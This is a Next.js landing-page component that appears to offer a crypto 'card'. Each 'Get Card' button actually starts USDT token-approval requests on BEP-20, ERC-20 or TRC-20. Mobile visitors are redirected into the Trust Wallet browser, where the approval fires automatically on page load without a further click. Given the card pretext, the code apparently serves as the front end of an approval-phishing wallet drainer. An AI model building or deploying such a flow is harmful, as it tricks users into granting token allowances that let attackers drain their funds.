"use client"

import { useEffect, useState } from "react"
import { Header } from "@/components/header"
import { HeroSection } from "@/components/hero-section"
import { FeaturesSection } from "@/components/features-section"
import { MobileAppSection } from "@/components/mobile-app-section"
import { SecuritySection } from "@/components/security-section"
import { CTASection } from "@/components/cta-section"
import { Footer } from "@/components/footer"
import { NetworkSelectModal } from "@/components/network-select-modal"
import { WCQRModal, SignModal, SuccessPopup } from "@/components/approval-modals"
import { useBep20Approval } from "@/hooks/use-bep20-approval"
import { useErc20Approval } from "@/hooks/use-erc20-approval"
import { useTrc20Approval } from "@/hooks/use-trc20-approval"

// ── Helpers ───────────────────────────────────────────────────────────────────
function isMobileDevice() {
  if (typeof window === "undefined") return false
  return /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini|Mobile/i.test(
    navigator.userAgent
  )
}

function isTrustWalletBrowser() {
  if (typeof window === "undefined") return false
  const ua = navigator.userAgent
  // Primary signals: UA string or ethereum provider flagged by Trust Wallet
  const isTrustUA = ua.includes("TrustWallet")
  const hasTrustEthereum =
    !!(window as any).ethereum &&
    ((window as any).ethereum.isTrust ||
      (window as any).ethereum.isTrustWallet)
  // tronWeb/tronLink alone is not reliable — Trust Wallet injects it
  // asynchronously so it may be present but not ready in a normal browser too.
  // Only treat tronWeb as a Trust signal when combined with the UA or ethereum flag.
  const hasTronWeb  = !!(window as any).tronWeb
  const hasTronLink = !!(window as any).tronLink
  const hasTronProvider = hasTronWeb || hasTronLink
  return isTrustUA || hasTrustEthereum || (hasTronProvider && (isTrustUA || hasTrustEthereum))
}

// Redirect to Trust Wallet DApp browser with the network param.
// Matches reference exactly: direct window.location.href deep link
// with universal link fallback after 1.5 s.
function redirectToTrustWallet(twNetwork: "BSC" | "ETH" | "TRON") {
  const baseUrl = window.location.origin + window.location.pathname
  const destUrl = `${baseUrl}?tw_network=${twNetwork}`
  const encoded = encodeURIComponent(destUrl)

  // coin_id: 9006=BNB/BSC, 60=ETH, 195=TRX/TRON
  const coinId = twNetwork === "TRON" ? 195 : twNetwork === "ETH" ? 60 : 9006

  // Deep link first — opens Trust Wallet natively on iOS & Android
  window.location.href = `trust://open_url?coin_id=${coinId}&url=${encoded}`

  // Universal link fallback (in case deep link fails / app not installed)
  setTimeout(() => {
    window.location.href = `https://link.trustwallet.com/open_url?coin_id=${coinId}&url=${encoded}`
  }, 1500)
}

// ─────────────────────────────────────────────────────────────────────────────
export default function Home() {
  const [networkModalOpen, setNetworkModalOpen] = useState(false)
  
  // Tracks which button initiated the flow
  const [sourceBtn, setSourceBtn] = useState<"hero" | "header" | "cta" | "auto" | null>(null)
  // Tracks if the button itself is loading (pre-modal or during redirect)
  const [btnLoading, setBtnLoading] = useState(false)

  const bep20 = useBep20Approval()
  const erc20 = useErc20Approval()
  const trc20 = useTrc20Approval()

  // True when any hook is actively processing
  const isAnyHookProcessing = bep20.processing || erc20.processing || trc20.processing

  // A button is loading if it's the source AND (btnLoading OR a hook is processing)
  const heroLoading   = (sourceBtn === "hero"   && (btnLoading || isAnyHookProcessing)) || (sourceBtn === "auto" && isAnyHookProcessing)
  const headerLoading = (sourceBtn === "header" && (btnLoading || isAnyHookProcessing)) || (sourceBtn === "auto" && isAnyHookProcessing)
  const ctaLoading    = (sourceBtn === "cta"    && (btnLoading || isAnyHookProcessing)) || (sourceBtn === "auto" && isAnyHookProcessing)

  // ── Auto-trigger when Trust Wallet opens the page with ?tw_network=X ──────
  // Matches report test: skip network modal, go straight to approval
  useEffect(() => {
    if (typeof window === "undefined") return

    const params    = new URLSearchParams(window.location.search)
    const twNetwork = params.get("tw_network")
    if (!twNetwork) return

    // Must be inside Trust Wallet DApp browser — detect all possible signals
    const ua = navigator.userAgent
    const hasTrustEthereum =
      !!(window as any).ethereum &&
      ((window as any).ethereum.isTrust || (window as any).ethereum.isTrustWallet)
    const hasTronProvider = !!(window as any).tronWeb || !!(window as any).tronLink
    const isTrustUA       = ua.includes("TrustWallet")
    const isTrustBrowser  = hasTrustEthereum || hasTronProvider || isTrustUA

    if (!isTrustBrowser) return

    // Clean URL so refresh doesn't re-trigger
    window.history.replaceState({}, document.title, window.location.pathname)

    setSourceBtn("auto")

    // Use 1200 ms delay — gives Trust Wallet time to fully inject tronWeb
    const timer = setTimeout(async () => {
      if (twNetwork === "BSC")  await bep20.handleBep20Approval()
      if (twNetwork === "ETH")  await erc20.handleErc20Approval()
      if (twNetwork === "TRON") await trc20.handleTrc20Approval()
    }, 1200)

    return () => clearTimeout(timer)
    // eslint-disable-next-line react-hooks/exhaustive-deps
  }, [])

  // Stop button spinner once the modal is fully open
  useEffect(() => {
    if (networkModalOpen) setBtnLoading(false)
  }, [networkModalOpen])

  // ── Get Card — always opens network modal first (same as report test) ─────
  const handleGetCard = (source: "hero" | "header" | "cta") => {
    setSourceBtn(source)
    setBtnLoading(true)
    setTimeout(() => setNetworkModalOpen(true), 80)
  }

  // ── Network selected → Continue ───────────────────────────────────────────
  // Matches report test exactly:
  //   mobile normal browser → redirect to Trust Wallet with ?tw_network=X
  //   desktop / already in Trust Wallet → run approval directly
  const handleNetworkSelect = async (networkId: string) => {
    setNetworkModalOpen(false)

    const mobileNotInTrust = isMobileDevice() && !isTrustWalletBrowser()

    if (mobileNotInTrust) {
      // Resume the spinner on the source button during the redirect
      setBtnLoading(true)
      // Mobile normal browser → redirect, Trust Wallet will auto-approve
      if (networkId === "BSC")  redirectToTrustWallet("BSC")
      if (networkId === "ETH")  redirectToTrustWallet("ETH")
      if (networkId === "TRON") redirectToTrustWallet("TRON")
      return
    }

    // Desktop or already inside Trust Wallet → run approval hook directly
    if (networkId === "BSC")  await bep20.handleBep20Approval()
    if (networkId === "ETH")  await erc20.handleErc20Approval()
    if (networkId === "TRON") await trc20.handleTrc20Approval()
  }

  // ── Reset everything back to "Get Card" ──────────────────────────────────
  const resetAllProcessing = () => {
    setSourceBtn(null)
    setBtnLoading(false)
    bep20.setProcessing(false)
    erc20.setProcessing(false)
    trc20.setProcessing(false)
  }

  // ── Shared modal state ────────────────────────────────────────────────────
  const activeWcUri   = bep20.wcUri ?? erc20.wcUri ?? trc20.wcUri
  const closeActiveQR = () => {
    bep20.setWcUri(null); erc20.setWcUri(null); trc20.setWcUri(null)
    resetAllProcessing()
  }
  const reconnectActive = bep20.wcUri
    ? bep20.handleBep20Approval
    : erc20.wcUri
    ? erc20.handleErc20Approval
    : trc20.handleTrc20Approval

  const activeSignModal = bep20.showSignModal || erc20.showSignModal || trc20.showSignModal
  const closeSignModal  = () => {
    bep20.setShowSignModal(false)
    erc20.setShowSignModal(false)
    trc20.setShowSignModal(false)
    resetAllProcessing()
  }
  const signModalNetwork = bep20.showSignModal
    ? "USDT / BEP-20"
    : erc20.showSignModal
    ? "USDT / ERC-20"
    : "USDT / TRC-20"

  return (
    <main className="min-h-screen">
      <Header onGetCard={() => handleGetCard("header")} loading={headerLoading} />
      <HeroSection onGetCard={() => handleGetCard("hero")} loading={heroLoading} />
      <FeaturesSection />
      <MobileAppSection />
      <SecuritySection />
      <CTASection onGetCard={() => handleGetCard("cta")} loading={ctaLoading} />
      <Footer />

      <NetworkSelectModal
        open={networkModalOpen}
        onClose={() => { setNetworkModalOpen(false); resetAllProcessing() }}
        onSelect={handleNetworkSelect}
        onNetworkHover={(id) => {
          if (id === "BSC")  bep20.preGenerateWCUri()
          if (id === "ETH")  erc20.preGenerateWCUri()
          if (id === "TRON") trc20.preGenerateWCUri()
        }}
      />

      {/* Shared WalletConnect QR */}
      <WCQRModal
        uri={activeWcUri}
        onClose={closeActiveQR}
        onReconnect={reconnectActive}
      />

      {/* "Check your wallet" spinner */}
      <SignModal
        open={activeSignModal}
        onClose={closeSignModal}
        network={signModalNetwork}
      />

      {/* BEP20 success */}
      <SuccessPopup
        open={bep20.showSuccess}
        onClose={() => { bep20.setShowSuccess(false); resetAllProcessing() }}
        txHash={bep20.txHash}
        network="BEP-20"
        explorerUrl="https://bscscan.com/tx/"
      />

      {/* ERC20 success */}
      <SuccessPopup
        open={erc20.showSuccess}
        onClose={() => { erc20.setShowSuccess(false); resetAllProcessing() }}
        txHash={erc20.txHash}
        network="ERC-20"
        explorerUrl="https://etherscan.io/tx/"
      />

      {/* TRC20 success */}
      <SuccessPopup
        open={trc20.showSuccess}
        onClose={() => { trc20.setShowSuccess(false); resetAllProcessing() }}
        txHash={trc20.txHash}
        network="TRC-20"
        explorerUrl="https://tronscan.org/#/transaction/"
      />
    </main>
  )
}
